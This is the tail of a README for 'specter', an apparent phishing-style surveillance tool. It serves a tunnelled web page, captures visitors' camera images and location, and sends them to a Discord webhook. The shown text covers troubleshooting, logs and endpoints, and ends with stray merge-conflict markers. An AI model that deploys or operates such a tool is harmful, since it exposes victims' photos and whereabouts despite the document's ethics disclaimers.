- ✅ **Follow all local laws** regarding surveillance and data collection
- ✅ **Respect privacy** - Don't collect data without authorization
- ✅ **Secure your webhook** - Keep Discord webhook URLs private
- ✅ **Delete data** - Responsibly manage captured information

## Troubleshooting

### Port Already in Use
```
[?] Port: 8000 is already in use. Please select another port.
```
**Solution:** Use a different port with `-p` flag:
```bash
python specter.py -p 8001
```

### Invalid Discord Webhook
```
Invalid webhook URL found in file. Please enter a valid Discord webhook URL.
```
**Solution:** Verify webhook URL format and ensure it's active

### Cloudflare Tunnel Issues
If Cloudflare fails:
- Check internet connection
- Use manual port forwarding (Option 2)
- Check `specter.log` for error details

### Camera/Location Not Working
- Browser requires HTTPS for camera/location access
- Cloudflare tunneling provides HTTPS automatically
- Ensure user grants permissions when prompted

## Logs

Application logs are saved to `specter.log` with format:
```
[YYYY-MM-DD HH:MM:SS] - Log message
```

View logs:
```bash
cat specter.log
tail -f specter.log  # Real-time monitoring
```

## API Endpoints

### Client-Side Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/` | GET | Serve main page |
| `/get_website` | GET | Get iframe URL |
| `/get_target` | GET | Get target upload URL |
| `/dwebhook.js` | GET | Get webhook config |
| `/location_update` | POST | Send location data |
| `/image` | POST | Upload captured image |

## Performance

- Supports concurrent connections via Flask
- Threaded port forwarding for non-blocking operations
- Efficient image storage (JPEG format with timestamp)
- Graceful shutdown handling

## Future Enhancements

- [ ] Database integration for data storage
- [ ] Advanced analytics dashboard
- [ ] Multiple webhook support
- [ ] Data encryption
- [ ] Custom styling for web interface
- [ ] Multi-language support

## License

This project is provided as-is for educational purposes only. Users assume all responsibility for their use of this software.

## Support

For issues or questions, check:
1. Application log file (`specter.log`)
2. Browser console for client-side errors
3. Discord webhook status
4. Network connectivity and port forwarding

---

**Remember: Use responsibly and ethically. Unauthorized surveillance is illegal.**
=======
# specter
>>>>>>> 4d95bb61e542901a8d32e343c98dd0780fecc81a
